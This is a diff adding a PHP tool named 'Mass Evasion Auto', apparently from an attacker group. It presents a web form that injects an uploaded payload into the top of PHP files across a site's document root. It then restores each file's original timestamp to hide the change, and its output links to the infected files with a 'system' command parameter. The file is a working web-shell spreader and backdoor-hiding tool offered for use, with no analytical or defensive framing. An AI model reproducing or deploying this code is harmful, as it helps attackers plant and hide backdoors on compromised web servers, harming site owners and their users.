@@ -1,0 +1,75 @@
+<?php
+
+/*
+ * Crafted by xpl0dec - Bhineka Tech
+ * If you only copy paste and recode the script, this means you don't have good skills
+ */
+
+class MassEvasion {
+
+    function __construct($dir) {
+        $this->dir = $dir;
+    }
+
+    function scanDir() {
+
+        $Directory = new \RecursiveDirectoryIterator($this->dir);
+        $iterator = new \RecursiveIteratorIterator($Directory);
+
+        $result = [];
+        foreach ($iterator as $info) {
+            $dir = $info->getPathname();
+            if(is_dir($dir)) {
+                $replace = preg_match("/\/*.*(\/)/i", $dir, $match);
+                array_push($result, $match[0]);
+            }
+        }
+
+        $lines = array_unique($result);
+        $last_result = [];
+        foreach($lines as $line) {
+            $file_php = glob($line . "/*.{php}", GLOB_BRACE);
+            array_push($last_result, $file_php[rand(0,10)]);
+        }
+        return array_filter($last_result);
+        }
+
+
+        function write($content) {
+                foreach($this->scanDir() as $dir) {
+                        if(file_exists($dir) && is_writable($dir)) {
+                                $time_file = filemtime($dir);
+                                $file_data = $content;
+                                $file_data .= file_get_contents($dir);
+                                if(!preg_match('/namespace/i', $file_data)) {
+                                        if(file_put_contents($dir, $file_data)) {
+                                                echo "success evasion in " . $dir . "?f=system&p=id&xx=true" . "<br>";
+                                                touch($dir, $time_file);
+                                        }
+                                }
+                        }
+                }
+        }
+
+}
+
+if(isset($_POST['click'])) {
+        $data = file_get_contents($_FILES['file_evas']['tmp_name']);
+        $obj = new MassEvasion($_POST['path']);
+        $obj->write($data);
+}
+?>
+
+
+<html>
+<head>
+<title>Mass Evasion Auto</title>
+</head>
+<body>
+        <form method="POST" action="" enctype="multipart/form-data">
+        <input ssdtype="text" name="path" value="<?= $_SERVER['DOCUMENT_ROOT'] ?>"/>
+                <input type="file" name="file_evas" />
+        <button type="submit" name="click">Gasss!</button>
+    </form>
+</body>
+</html>
